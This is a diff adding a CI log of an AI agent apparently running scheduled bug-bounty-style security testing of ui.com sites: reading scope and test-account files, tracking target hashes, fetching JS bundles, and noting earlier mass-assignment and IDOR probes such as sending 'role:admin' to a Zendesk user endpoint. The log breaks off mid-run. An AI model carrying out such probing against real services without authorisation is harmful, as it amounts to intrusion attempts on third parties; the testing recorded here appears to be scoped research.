@@ -137817,3 +137817,2986 @@ Completed Session 33 per `skills/AGENT.md`.
 - Tested previously untested in-scope endpoints: `POST account.svc /chat/messaging/jwt` and `GET/POST /zendesk/user` — both session-derived and ignore all client identity/role overrides. Also probed `zendesk/tickets/ccd`, `account-chooser`, `sso /geo`, and cloudaccess `application-devices` (all negative/unresolved).
 - No high-impact XSS/CSTI/IDOR/BAC/open-redirect confirmed; `result/confirmed-vuln.txt` unchanged and no Discord notification sent.
 - Updated `SUMMARY.md`, `progress.md`, `unresolved.md`, inventories, and added `session33-ledger.md` + evidence under `result/`.
+
+===== OPENCODE RUN 46121315468 2026-11-28T07:28:18Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+[0m→ [0mRead skills/AGENT.md
+I'll follow the AGENT.md workflow. Starting with preflight and reading inputs.
+[0m
+[0m$ [0mecho "=== tools check ==="; for t in opencode curl git node npx python3 google-chrome-stable google-chrome chromium chromium-browser; do printf "%s: " "$t"; command -v "$t" || echo MISSING; done
+=== tools check ===
+opencode: /home/runner/.opencode/bin/opencode
+curl: /usr/bin/curl
+git: /usr/bin/git
+node: /opt/hostedtoolcache/node/22.23.5/x64/bin/node
+npx: /opt/hostedtoolcache/node/22.23.5/x64/bin/npx
+python3: /usr/bin/python3
+google-chrome-stable: /usr/bin/google-chrome-stable
+google-chrome: /usr/bin/google-chrome
+chromium: /usr/bin/chromium
+chromium-browser: /usr/bin/chromium-browser
+[0m
+[0m$ [0mpwd && ls -la && echo "--- data ---" && ls -la data/ 2>/dev/null && echo "--- creds ---" && ls -la creds/ 2>/dev/null && echo "--- result ---" && ls -la result/ 2>/dev/null && echo "--- tools ---" && ls -la tools/ 2>/dev/null && echo "--- skills ---" && ls -la skills/
+/home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+total 48
+drwxr-xr-x 10 runner runner 4096 Nov 28 07:28 .
+drwxr-xr-x  3 runner runner 4096 Nov 28 07:27 ..
+drwxr-xr-x  7 runner runner 4096 Nov 28 07:28 .git
+drwxr-xr-x  3 runner runner 4096 Nov 28 07:27 .github
+-rw-r--r--  1 runner runner  355 Nov 28 07:27 .gitignore
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 creds
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 data
+-rw-r--r--  1 runner runner  332 Nov 28 07:28 opencode.json
+drwxr-xr-x  7 runner runner 4096 Nov 28 07:27 result
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 skills
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 tools
+drwxr-xr-x 17 runner runner 4096 Nov 28 07:27 vulnebleti
+--- data ---
+total 12
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 .
+drwxr-xr-x 10 runner runner 4096 Nov 28 07:28 ..
+-rw-r--r--  1 runner runner    0 Nov 28 07:27 .gitkeep
+-rw-r--r--  1 runner runner 3238 Nov 28 07:27 targets.txt
+--- creds ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 .
+drwxr-xr-x 10 runner runner 4096 Nov 28 07:28 ..
+-rw-r--r--  1 runner runner    0 Nov 28 07:27 .gitkeep
+-rw-r--r--  1 runner runner  466 Nov 28 07:27 README.md
+-rw-r--r--  1 runner runner  320 Nov 28 07:27 test-account.txt
+--- result ---
+total 228
+drwxr-xr-x  7 runner runner  4096 Nov 28 07:27 .
+drwxr-xr-x 10 runner runner  4096 Nov 28 07:28 ..
+-rw-r--r--  1 runner runner     0 Nov 28 07:27 .gitkeep
+-rw-r--r--  1 runner runner 44175 Nov 28 07:27 SUMMARY.md
+drwxr-xr-x  5 runner runner  4096 Nov 28 07:27 client-side
+-rw-r--r--  1 runner runner   178 Nov 28 07:27 confirmed-vuln.txt
+drwxr-xr-x  9 runner runner  4096 Nov 28 07:27 findings
+drwxr-xr-x  2 runner runner  4096 Nov 28 07:27 inventory
+drwxr-xr-x  3 runner runner  4096 Nov 28 07:27 logs
+-rw-r--r--  1 runner runner  5687 Nov 28 07:27 out-of-scope.txt
+-rw-r--r--  1 runner runner 59398 Nov 28 07:27 progress.md
+-rw-r--r--  1 runner runner  2839 Nov 28 07:27 scope.md
+drwxr-xr-x  4 runner runner  4096 Nov 28 07:27 server-side
+-rw-r--r--  1 runner runner 56347 Nov 28 07:27 testing-inventory.json
+-rw-r--r--  1 runner runner 21295 Nov 28 07:27 unresolved.md
+--- tools ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Nov 28 07:27 .
+drwxr-xr-x 10 runner runner 4096 Nov 28 07:28 ..
+-rwxr-xr-x  1 runner runner 2106 Nov 28 07:27 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Nov 28 07:27 cmd.txt
+--- skills ---
+total 76
+drwxr-xr-x  2 runner runner  4096 Nov 28 07:27 .
+drwxr-xr-x 10 runner runner  4096 Nov 28 07:28 ..
+-rw-r--r--  1 runner runner     0 Nov 28 07:27 .gitkeep
+-rw-r--r--  1 runner runner 35029 Nov 28 07:27 AGENT.md
+-rw-r--r--  1 runner runner 11864 Nov 28 07:27 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Nov 28 07:27 server-side-skill.md
+[0m
+[0m$ [0mecho "=== target-state ==="; cat result/logs/target-state.txt 2>/dev/null; echo; echo "=== targets.sha256 ==="; cat result/logs/targets.sha256 2>/dev/null; echo; echo "=== confirmed-vuln ==="; cat result/confirmed-vuln.txt; echo; echo "=== logs dir ==="; ls -la result/logs/
+=== target-state ===
+run_id=42837084733
+event=schedule
+timestamp=2026-11-10T14:44:47Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=575c39e0a7294a2ae908629c606dc88d7fb008e1df9a2b9e5c26fcdaeae79c1e
+decision=reset
+---
+run_id=42843791805
+event=workflow_dispatch
+timestamp=2026-11-10T15:24:01Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=42850898064
+event=workflow_dispatch
+timestamp=2026-11-10T16:05:06Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=42920600593
+event=schedule
+timestamp=2026-11-10T23:07:41Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=42968379409
+event=schedule
+timestamp=2026-11-11T05:51:09Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43034033571
+event=schedule
+timestamp=2026-11-11T14:02:32Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43127366314
+event=schedule
+timestamp=2026-11-12T00:27:35Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43492795808
+event=schedule
+timestamp=2026-11-13T19:30:50Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43564092459
+event=schedule
+timestamp=2026-11-14T05:59:37Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43599586173
+event=schedule
+timestamp=2026-11-14T13:24:58Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43647019119
+event=schedule
+timestamp=2026-11-14T22:14:43Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43683615848
+event=schedule
+timestamp=2026-11-15T06:02:41Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=43814022276
+event=schedule
+timestamp=2026-11-16T06:02:20Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44040401507
+event=schedule
+timestamp=2026-11-17T07:40:04Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44172538463
+event=schedule
+timestamp=2026-11-17T20:45:18Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44389993020
+event=schedule
+timestamp=2026-11-18T20:21:01Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44476502964
+event=schedule
+timestamp=2026-11-19T07:03:05Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44608386930
+event=schedule
+timestamp=2026-11-19T20:25:10Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44691116563
+event=schedule
+timestamp=2026-11-20T06:55:16Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44693276852
+event=workflow_dispatch
+timestamp=2026-11-20T07:13:16Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44806658644
+event=schedule
+timestamp=2026-11-20T19:56:27Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44808958569
+event=workflow_dispatch
+timestamp=2026-11-20T20:11:12Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44877402800
+event=schedule
+timestamp=2026-11-21T06:50:28Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44938664076
+event=schedule
+timestamp=2026-11-21T19:01:52Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=44993390446
+event=schedule
+timestamp=2026-11-22T06:22:28Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45129527345
+event=schedule
+timestamp=2026-11-23T07:14:20Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45133306377
+event=workflow_dispatch
+timestamp=2026-11-23T07:45:09Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45291357082
+event=schedule
+timestamp=2026-11-23T23:44:46Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45366850654
+event=schedule
+timestamp=2026-11-24T09:37:19Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45573672108
+event=schedule
+timestamp=2026-11-25T08:08:57Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45578135995
+event=workflow_dispatch
+timestamp=2026-11-25T08:40:02Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45579991342
+event=workflow_dispatch
+timestamp=2026-11-25T08:52:12Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45779124357
+event=schedule
+timestamp=2026-11-26T07:57:24Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45897387792
+event=schedule
+timestamp=2026-11-26T21:20:27Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=45962134367
+event=schedule
+timestamp=2026-11-27T07:58:51Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=46067375410
+event=schedule
+timestamp=2026-11-27T21:00:47Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+run_id=46121315468
+event=schedule
+timestamp=2026-11-28T07:28:15Z
+target_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+previous_hash=3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+decision=preserved
+---
+
+=== targets.sha256 ===
+3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+
+=== confirmed-vuln ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+
+=== logs dir ===
+total 12672
+drwxr-xr-x  3 runner runner     4096 Nov 28 07:27 .
+drwxr-xr-x  7 runner runner     4096 Nov 28 07:27 ..
+-rw-r--r--  1 runner runner     2500 Nov 28 07:27 agent-exit-code.txt
+-rw-r--r--  1 runner runner     1826 Nov 28 07:27 agent-watchdog.txt
+-rw-r--r--  1 runner runner       96 Nov 28 07:27 auto-restart-requested.txt
+-rw-r--r--  1 runner runner      208 Nov 28 07:27 checkpoint-validation.txt
+-rw-r--r--  1 runner runner     3650 Nov 28 07:27 client-side.log
+-rw-r--r--  1 runner runner     7972 Nov 28 07:27 diagnostics-index.txt
+drwxr-xr-x 41 runner runner     4096 Nov 28 07:27 opencode
+-rw-r--r--  1 runner runner     1212 Nov 28 07:27 opencode-reinstall-20261110T152046Z.log
+-rw-r--r--  1 runner runner     1532 Nov 28 07:27 opencode-reinstall-20261110T160158Z.log
+-rw-r--r--  1 runner runner     1132 Nov 28 07:27 opencode-reinstall-20261120T071003Z.log
+-rw-r--r--  1 runner runner     1132 Nov 28 07:27 opencode-reinstall-20261120T200804Z.log
+-rw-r--r--  1 runner runner     1132 Nov 28 07:27 opencode-reinstall-20261121T070545Z.log
+-rw-r--r--  1 runner runner     1132 Nov 28 07:27 opencode-reinstall-20261123T074159Z.log
+-rw-r--r--  1 runner runner     1052 Nov 28 07:27 opencode-reinstall-20261125T083604Z.log
+-rw-r--r--  1 runner runner     1132 Nov 28 07:27 opencode-reinstall-20261125T084841Z.log
+-rw-r--r--  1 runner runner 12814716 Nov 28 07:28 opencode.log
+-rw-r--r--  1 runner runner     4542 Nov 28 07:27 server-side.log
+-rw-r--r--  1 runner runner    54070 Nov 28 07:27 session.md
+-rw-r--r--  1 runner runner     9087 Nov 28 07:28 target-state.txt
+-rw-r--r--  1 runner runner       65 Nov 28 07:28 targets.sha256
+-rw-r--r--  1 runner runner     3238 Nov 28 07:28 targets.used.txt
+[0m
+[0m→ [0mRead data/targets.txt
+[0m→ [0mRead result/scope.md
+[0m→ [0mRead creds/test-account.txt
+This is a continuation with existing results. Reading resume state and inputs.
+[0m→ [0mRead result/SUMMARY.md
+[0m
+[0m$ [0mecho "=== findings ==="; ls -R result/findings/ | head -80; echo; echo "=== inventory ==="; ls -la result/inventory/; echo; echo "=== client-side ==="; ls -R result/client-side/ | head -60; echo; echo "=== server-side ==="; ls -R result/server-side/ | head -60
+=== findings ===
+result/findings/:
+VULN-20261110-001
+VULN-20261110-002
+VULN-20261110-003
+VULN-20261110-004
+VULN-20261111-001
+VULN-20261114-001
+VULN-20261123-001
+cors-credentialed-reflection.md
+
+result/findings/VULN-20261110-001:
+evidence
+report.md
+
+result/findings/VULN-20261110-001/evidence:
+enumeration.txt
+
+result/findings/VULN-20261110-002:
+evidence
+report.md
+
+result/findings/VULN-20261110-002/evidence:
+pre-mfa-login-response.txt
+
+result/findings/VULN-20261110-003:
+evidence
+report.md
+
+result/findings/VULN-20261110-003/evidence:
+backup-remint.txt
+
+result/findings/VULN-20261110-004:
+evidence
+report.md
+
+result/findings/VULN-20261110-004/evidence:
+logout-get.txt
+
+result/findings/VULN-20261111-001:
+evidence
+payloads
+report.md
+
+result/findings/VULN-20261111-001/evidence:
+01-zendesk-html-render.txt
+02-ac-redirect-allowlist.txt
+zendesk-html-escaping.json
+
+result/findings/VULN-20261111-001/payloads:
+README.md
+
+result/findings/VULN-20261114-001:
+evidence
+report.md
+
+result/findings/VULN-20261114-001/evidence:
+confirm-invitation-code.txt
+confirm-invitation-probe.txt
+deeplink-role-source.txt
+
+result/findings/VULN-20261123-001:
+evidence
+report.md
+
+result/findings/VULN-20261123-001/evidence:
+picture-unauth.txt
+
+=== inventory ===
+total 60
+drwxr-xr-x 2 runner runner  4096 Nov 28 07:27 .
+drwxr-xr-x 7 runner runner  4096 Nov 28 07:27 ..
+-rw-r--r-- 1 runner runner 23085 Nov 28 07:27 endpoints.md
+-rw-r--r-- 1 runner runner  5566 Nov 28 07:27 javascript.md
+-rw-r--r-- 1 runner runner   866 Nov 28 07:27 listeners.md
+-rw-r--r-- 1 runner runner  8569 Nov 28 07:27 routes.md
+-rw-r--r-- 1 runner runner   762 Nov 28 07:27 sinks.md
+
+=== client-side ===
+result/client-side/:
+account.ui.com
+unifi.ui.com
+www.ui.com
+
+result/client-side/account.ui.com:
+login
+subscribe
+subscriptions-cyber-secure-subscribe
+
+result/client-side/account.ui.com/login:
+javascript
+session5-deep-review.md
+
+result/client-side/account.ui.com/login/javascript:
+index-BAUIMHQa.js
+manifest.md
+snippets
+
+result/client-side/account.ui.com/login/javascript/snippets:
+ac-redirect-allowlist.txt
+api-config.txt
+zendesk-html-render.txt
+
+result/client-side/account.ui.com/subscribe:
+report.md
+
+result/client-side/account.ui.com/subscriptions-cyber-secure-subscribe:
+route-report.md
+
+result/client-side/unifi.ui.com:
+invite
+
+result/client-side/unifi.ui.com/invite:
+javascript
+report.md
+
+result/client-side/unifi.ui.com/invite/javascript:
+snippets
+
+result/client-side/unifi.ui.com/invite/javascript/snippets:
+invite-role-flow.txt
+
+result/client-side/www.ui.com:
+home
+identity-qrcode-desktop-bt_pairing
+
+result/client-side/www.ui.com/home:
+flows.md
+javascript
+listeners.md
+route-report.md
+sinks.md
+sources.md
+
+result/client-side/www.ui.com/home/javascript:
+manifest.md
+snippets
+
+result/client-side/www.ui.com/home/javascript/snippets:
+
+=== server-side ===
+result/server-side/:
+account.ui.com
+cloudaccess.svc.ui.com
+
+result/server-side/account.ui.com:
+api-inventory.md
+session10-ledger.md
+session16-ledger.md
+session17-ledger.md
+session18-ledger.md
+session19-ledger.md
+session23-ledger.md
+session24-ledger.md
+session25-ledger.md
+session26-ledger.md
+session27-ledger.md
+session28-ledger.md
+session29-ledger.md
+session30-ledger.md
+session31-ledger.md
+session32-ledger.md
+session33-ledger.md
+traffic
+
+result/server-side/account.ui.com/traffic:
+session16-endpoints.txt
+session16-mass-assignment.txt
+session17-chat-queue.txt
+session18-bundle-diff.txt
+session18-legacy-email.txt
+session19-account-chooser-2fa-reset.txt
+session25-zendesk-login-cors-jsonp.txt
+session26-newcover.txt
+session27-www-sso-account.txt
+session29-discovery-authz.txt
+session30-cybersecure-delta.txt
+session32-newtests.txt
+session33-newtests.txt
+
+result/server-side/cloudaccess.svc.ui.com:
+confirm-invitation.md
+[0m
+Latest decision is `preserved` — continuation. Reading prior summary, progress, and inventory state.
+[0m→ [0mRead result/progress.md
+[0m→ [0mRead result/inventory/routes.md
+Reading the progress ledger, route inventory, and both skill files before testing.
+[0m→ [0mRead result/progress.md[90m [offset=782][0m
+[0m→ [0mRead skills/client-side-skill.md
+[0m→ [0mRead skills/server-side-skill.md
+Now reading the server-side skill and checking MCP availability.
+[0m⚙ [0mchrome-devtools_list_pages Unknown
+[0m
+[0m$ [0mdate -u +"%Y-%m-%dT%H:%M:%SZ"; echo "---"; ls -la result/logs/session.md; tail -20 result/logs/session.md
+2026-11-28T07:28:46Z
+---
+-rw-r--r-- 1 runner runner 54070 Nov 28 07:27 result/logs/session.md
+- **New in-scope endpoint `GET/POST account.svc /zendesk/user`** (POST never tested): returns
+  only A's linked Zendesk user (`44644434942359`, `end-user`, `external_id`=A uuid). POST body
+  `name`/`email`(=B)/`external_id`(=B uuid)/`role:admin` are **all ignored**; persisted Zendesk
+  user unchanged. **Not Vulnerable (self-scoped, no mass assignment).**
+- `GET account.svc /zendesk/tickets/ccd` -> `{"tickets":[],"totalTickets":0}`; GET
+  `/zendesk/search_tickets` and `/search_ccd` -> 404 (POST/captcha-gated, known).
+  `GET sso.ui.com /api/sso/v1/account-chooser` -> `{"accounts":[]}` both authenticated and
+  unauthenticated (no data leak).
+- `GET cloudaccess.svc /devices/{id}/application-devices` -> 403 `Missing Authentication Token`
+  (requires SigV4/STS; A owns no devices); `GET sso.ui.com /geo` -> 404.
+- Site Manager same-origin `/api/...` paths (`/api/v2/organizations`, `/api/v2/user`,
+  `/api/self/sites`, `/msp-invitations`, `/api/v1/site-managers/devices`, etc.) all return the
+  1,496-byte SPA `index.html` fallback on `unifi.ui.com`; the real API bases are the
+  out-of-scope `*.svc.ui.com` hosts / console proxies, so these are not directly callable
+  in-scope endpoints (no new testable surface).
+- No new route; ledger remains **57 routes (42 done / 15 blocked)**. No new confirmed
+  high-impact finding; `confirmed-vuln.txt` unchanged; no Discord notification.
+- Ledger: result/server-side/account.ui.com/session33-ledger.md
+  Evidence: result/server-side/account.ui.com/traffic/session33-newtests.txt
+== session end 2026-11-27T21:20:00Z ==
+[0m
+MCP works. Recording session start and checking for build deltas.
+[0m$ [0mcd /tmp && mkdir -p s34 && cd s34
+echo "=== account.ui.com login page ==="
+curl -fsS --max-time 20 -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" https://account.ui.com/login -o account-login.html
+grep -oE 'assets/[A-Za-z0-9_-]+\.js' account-login.html | sort -u
+echo "=== script srcs ==="
+grep -oE 'src="[^"]+\.js"' account-login.html | head -20
+echo "=== www ui.com ==="
+curl -fsS --max-time 20 https://www.ui.com/ -o www.html -D www-headers.txt
+grep -oiE 'dpl=[a-f0-9]+' www.html | head -3
+grep -oE '/_next/static/[^"]+\.js' www.html | head -5
+echo "=== headers ==="
+head -20 www-headers.txt
+=== account.ui.com login page ===
+assets/index-D7cQ-F1j.js
+=== script srcs ===
+src="https://static.ada.support/embed2.js"
+src="/assets/index-D7cQ-F1j.js"
+=== www ui.com ===
+dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14
+dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14
+dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14
+/_next/static/chunks/42snxfm7shlge.js
+/_next/static/chunks/0w25l1y4sjmmp.js
+/_next/static/chunks/0w9snb1cuo60k.js
+/_next/static/chunks/0yq4grgdgv_kn.js
+/_next/static/chunks/turbopack-077hmtqrhcoji.js
+=== headers ===
+HTTP/2 200 
+content-type: text/html; charset=utf-8
+content-length: 372465
+date: Wed, 25 Nov 2026 13:33:33 GMT
+etag: "35vrps4boo7zdq"
+set-cookie: store-referer=us; Path=/; Expires=Thu, 25 Nov 2027 13:33:33 GMT; Max-Age=31536000; Domain=.ui.com; Secure; SameSite=lax
+set-cookie: microsite-language=EN; Path=/; Expires=Thu, 25 Nov 2027 13:33:33 GMT; Max-Age=31536000; Domain=.ui.com; Secure; SameSite=lax
+set-cookie: country-code-session=US; Path=/; Domain=.ui.com; Secure; SameSite=lax
+x-middleware-rewrite: /us/en
+x-nextjs-cache: HIT
+x-nextjs-prerender: 1
+x-nextjs-prerender: 1
+x-nextjs-stale-time: 300
+cache-control: s-maxage=31536000
+vary: rsc,next-router-state-tree,next-router-prefetch,next-router-segment-prefetch,Accept-Encoding
+x-cache: Hit from cloudfront
+via: 1.1 349f79c1d7a1f6518d788a69029c3966.cloudfront.net (CloudFront)
+x-amz-cf-pop: DFW56-P13
+alt-svc: h3=":443"; ma=86400
+x-amz-cf-id: THDr_ch_L_74mLhdFpa4FL5MKx4cTU4jQP3yeKmBuIcnC1WC0JBUKQ==
+[0m
+New `www.ui.com` deploy detected (`dpl=d6fbc335…`, was `e1f4c3c3…`). Recording session and auditing the new build.
+[0m$ [0mcd /tmp/s34
+# download account bundle & hash
+curl -fsS --max-time 60 -A "Mozilla/5.0" https://account.ui.com/assets/index-D7cQ-F1j.js -o account.js
+ls -l account.js; sha256sum account.js
+# www: collect all chunk paths from html
+grep -oE '/_next/static/chunks/[A-Za-z0-9_./-]+\.js' www.html | sort -u > www-chunks.txt
+wc -l www-chunks.txt
+grep -oE '/_next/static/[A-Za-z0-9_./-]+\.js' www.html | sort -u > www-alljs.txt
+wc -l www-alljs.txt
+head -5 www-alljs.txt
+-rw-r--r-- 1 runner runner 7279731 Nov 28 07:28 account.js
+f75b4c9c740a61e5794cd7a707e81d17dad65972fe8349a39c3da8fa82fd303a  account.js
+36 www-chunks.txt
+36 www-alljs.txt
+/_next/static/chunks/01lu87tmwy33h.js
+/_next/static/chunks/02aqcd17vx73t.js
+/_next/static/chunks/02artkfhcdhr9.js
+/_next/static/chunks/08ap5_0xtv1jr.js
+/_next/static/chunks/099-ze3g9j76l.js
+[0m
+[0m$ [0mcd /tmp/s34
+cat >> /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn/result/logs/session.md <<'EOF'
+
+## Session 34 start 2026-11-28T07:28:46Z
+- Continuation (decision=preserved, target_hash 3353d9c6...).
+- MCP chrome-devtools: available (list_pages OK).
+- Build check: account.ui.com still `assets/index-D7cQ-F1j.js` (unchanged vs S33).
+  www.ui.com REDEPLOYED `dpl=d6fbc335af54cb2739a6c9ebd9f765dc52426e14` (was e1f4c3c3...).
+EOF
+echo "=== unifi Site Manager main bundles ==="
+curl -fsS --max-time 20 -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1" https://unifi.ui.com/ -o unifi.html
+grep -oE '(main-[0-9]+\.[a-f0-9]+\.js|index-[A-Za-z0-9_-]+\.js|/assets/[^"]+\.js)' unifi.html | sort -u | head -30
+echo "=== activate ==="
+curl -fsS --max-time 20 https://activate.ui.com/ -o activate.html
+grep -oE 'index-[A-Za-z0-9_-]+\.js|/assets/[^"]+\.js' activate.html | sort -u | head
+=== unifi Site Manager main bundles ===
+=== activate ===
+/assets/index-1CNh1WqS.js
+[0m
+[0m$ [0mcd /tmp/s34
+echo "=== unifi redirect/headers ==="
+curl -sS --max-time 20 -D - -o /dev/null -A "Mozilla/5.0" https://unifi.ui.com/ | head -25
+echo "=== raw unifi html size ==="
+ls -l unifi.html 2>/dev/null; grep -oE 'src="[^"]+"' unifi.html | head -20
+=== unifi redirect/headers ===
+HTTP/2 302 
+server: CloudFront
+date: Sat, 28 Nov 2026 07:29:01 GMT
+content-length: 0
